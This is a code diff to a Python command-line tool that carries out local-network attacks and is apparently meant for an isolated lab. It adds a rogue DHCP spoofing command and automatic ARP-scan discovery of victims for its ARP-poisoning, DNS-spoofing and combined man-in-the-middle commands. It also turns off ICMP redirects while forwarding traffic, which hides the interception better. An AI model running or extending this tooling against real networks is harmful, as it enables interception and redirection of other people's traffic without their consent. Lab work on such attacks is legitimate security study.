@@ -15,7 +15,9 @@ from lab.network import (
     interface_ipv4,
     ipv4_forwarding_enabled,
     list_interfaces,
+    send_redirects_enabled,
     set_ipv4_forwarding,
+    set_send_redirects,
 )
 
 
@@ -56,6 +58,16 @@ def parse_args() -> argparse.Namespace:
     dns.add_argument("--domains", nargs="*")
     dns.add_argument("--packet-count", type=int, default=0)
 
+    dhcp = subparsers.add_parser("dhcp-spoof", help="Broadcast rogue DHCP offers and ACKs inside the isolated lab")
+    dhcp.add_argument("--interface", required=True)
+    dhcp.add_argument("--victim-ip")
+    dhcp.add_argument("--victim-mac")
+    dhcp.add_argument("--server-ip")
+    dhcp.add_argument("--offered-ip")
+    dhcp.add_argument("--interval", type=float, default=2.0)
+    dhcp.add_argument("--cycles", type=int)
+    dhcp.add_argument("--no-ack", action="store_true")
+
     mitm = subparsers.add_parser("mitm-dns", help="Run ARP poisoning and DNS spoofing together")
     mitm.add_argument("--interface", required=True)
     mitm.add_argument("--victim-ip")
@@ -86,6 +98,22 @@ def install_stop_signal_handlers(stop_event: threading.Event) -> None:
 
     signal.signal(signal.SIGINT, _handler)
     signal.signal(signal.SIGTERM, _handler)
+
+
+def suppress_send_redirects(interface: str) -> dict[str, bool]:
+    previous = {
+        "all": send_redirects_enabled("all"),
+        interface: send_redirects_enabled(interface),
+    }
+    for scope, enabled in previous.items():
+        if enabled:
+            set_send_redirects(False, scope)
+    return previous
+
+
+def restore_send_redirects(previous: dict[str, bool]) -> None:
+    for scope, enabled in previous.items():
+        set_send_redirects(enabled, scope)
 
 
 def main() -> int:
@@ -126,17 +154,33 @@ def main() -> int:
     if args.command == "arp-poison":
         stop_event = threading.Event()
         install_stop_signal_handlers(stop_event)
+        resolved_victim_ip = args.victim_ip
+        if not resolved_victim_ip:
+            discovered_victim = runner.discover_victim()
+            resolved_victim_ip = discovered_victim.ip
+            print_json(
+                event_payload(
+                    "victim_discovered",
+                    interface=args.interface,
+                    victim_ip=resolved_victim_ip,
+                    victim_mac=discovered_victim.mac,
+                    method="arp_scan",
+                )
+            )
         poisoner = runner.build_arp_poisoner(
-            victim_ip=args.victim_ip,
+            victim_ip=resolved_victim_ip,
             gateway_ip=args.gateway_ip,
             interval=args.interval,
         )
         endpoints = poisoner.resolve_endpoints()
         changed_forwarding = False
+        previous_send_redirects: dict[str, bool] = {}
         try:
-            if args.enable_forwarding and not ipv4_forwarding_enabled():
-                set_ipv4_forwarding(True)
-                changed_forwarding = True
+            if args.enable_forwarding:
+                if not ipv4_forwarding_enabled():
+                    set_ipv4_forwarding(True)
+                    changed_forwarding = True
+                previous_send_redirects = suppress_send_redirects(args.interface)
             print_json(
                 event_payload(
                     "arp_poison_started",
@@ -176,15 +220,30 @@ def main() -> int:
             )
             if changed_forwarding:
                 set_ipv4_forwarding(False)
+            if previous_send_redirects:
+                restore_send_redirects(previous_send_redirects)
         return 0
 
     if args.command == "dns-spoof":
         stop_event = threading.Event()
         install_stop_signal_handlers(stop_event)
+        resolved_victim_ip = args.victim_ip
+        if not resolved_victim_ip:
+            discovered_victim = runner.discover_victim()
+            resolved_victim_ip = discovered_victim.ip
+            print_json(
+                event_payload(
+                    "victim_discovered",
+                    interface=args.interface,
+                    victim_ip=resolved_victim_ip,
+                    victim_mac=discovered_victim.mac,
+                    method="arp_scan",
+                )
+            )
         spoofer = runner.build_dns_spoofer(
             answer_ip=args.answer_ip,
             domains=args.domains,
-            victim_ip=args.victim_ip,
+            victim_ip=resolved_victim_ip,
         )
         print_json(
             event_payload(
@@ -211,11 +270,73 @@ def main() -> int:
         print_json(event_payload("dns_spoof_stopped", interface=args.interface))
         return 0
 
+    if args.command == "dhcp-spoof":
+        stop_event = threading.Event()
+        install_stop_signal_handlers(stop_event)
+        discovered_victim = runner.discover_victim()
+        resolved_victim_ip = args.victim_ip or discovered_victim.ip
+        resolved_victim_mac = (args.victim_mac or discovered_victim.mac).lower()
+        print_json(
+            event_payload(
+                "victim_discovered",
+                interface=args.interface,
+                victim_ip=resolved_victim_ip,
+                victim_mac=resolved_victim_mac,
+                method="arp_scan",
+            )
+        )
+        rogue_server = runner.build_rogue_dhcp_server(
+            victim_ip=resolved_victim_ip,
+            victim_mac=resolved_victim_mac,
+            server_ip=args.server_ip,
+            offered_ip=args.offered_ip,
+            interval=args.interval,
+            include_ack=not args.no_ack,
+        )
+        print_json(
+            event_payload(
+                "dhcp_spoof_started",
+                interface=args.interface,
+                victim_ip=resolved_victim_ip,
+                victim_mac=resolved_victim_mac,
+                server_ip=rogue_server.server_ip,
+                offered_ip=rogue_server.offered_ip,
+                include_ack=rogue_server.include_ack,
+            )
+        )
+        rogue_server.run(
+            cycles=args.cycles,
+            stop_requested=stop_event.is_set,
+            on_event=lambda event: print_json(
+                event_payload(
+                    f"rogue_dhcp_{event.message_type}",
+                    client_mac=event.client_mac,
+                    offered_ip=event.offered_ip,
+                    server_ip=event.server_ip,
+                )
+            ),
+        )
+        print_json(event_payload("dhcp_spoof_stopped", interface=args.interface))
+        return 0
+
     if args.command == "mitm-dns":
         stop_event = threading.Event()
         install_stop_signal_handlers(stop_event)
+        resolved_victim_ip = args.victim_ip
+        if not resolved_victim_ip:
+            discovered_victim = runner.discover_victim()
+            resolved_victim_ip = discovered_victim.ip
+            print_json(
+                event_payload(
+                    "victim_discovered",
+                    interface=args.interface,
+                    victim_ip=resolved_victim_ip,
+                    victim_mac=discovered_victim.mac,
+                    method="arp_scan",
+                )
+            )
         poisoner = runner.build_arp_poisoner(
-            victim_ip=args.victim_ip,
+            victim_ip=resolved_victim_ip,
             gateway_ip=args.gateway_ip,
             interval=args.interval,
         )
@@ -223,7 +344,7 @@ def main() -> int:
         spoofer = runner.build_dns_spoofer(
             answer_ip=args.answer_ip,
             domains=args.domains,
-            victim_ip=args.victim_ip,
+            victim_ip=resolved_victim_ip,
         )
 
         poison_thread = threading.Thread(
@@ -246,10 +367,13 @@ def main() -> int:
         )
 
         changed_forwarding = False
+        previous_send_redirects: dict[str, bool] = {}
         try:
-            if args.enable_forwarding and not ipv4_forwarding_enabled():
-                set_ipv4_forwarding(True)
-                changed_forwarding = True
+            if args.enable_forwarding:
+                if not ipv4_forwarding_enabled():
+                    set_ipv4_forwarding(True)
+                    changed_forwarding = True
+                previous_send_redirects = suppress_send_redirects(args.interface)
             print_json(
                 event_payload(
                     "mitm_dns_started",
@@ -289,6 +413,8 @@ def main() -> int:
             )
             if changed_forwarding:
                 set_ipv4_forwarding(False)
+            if previous_send_redirects:
+                restore_send_redirects(previous_send_redirects)
         return 0
 
     raise SystemExit(f"Unknown command: {args.command}")
